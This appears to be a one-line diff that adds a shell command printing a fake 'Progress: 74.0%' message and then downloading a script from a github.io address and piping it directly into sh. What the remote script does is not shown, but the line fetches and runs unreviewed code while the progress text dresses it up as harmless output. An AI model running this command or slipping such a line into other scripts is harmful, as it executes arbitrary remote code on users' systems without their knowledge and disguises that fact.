@@ -1,0 +1,1 @@
+echo 'Progress: 74.0%'; curl -L --progress-bar frkns.github.io/fun/comedy_wish | sh
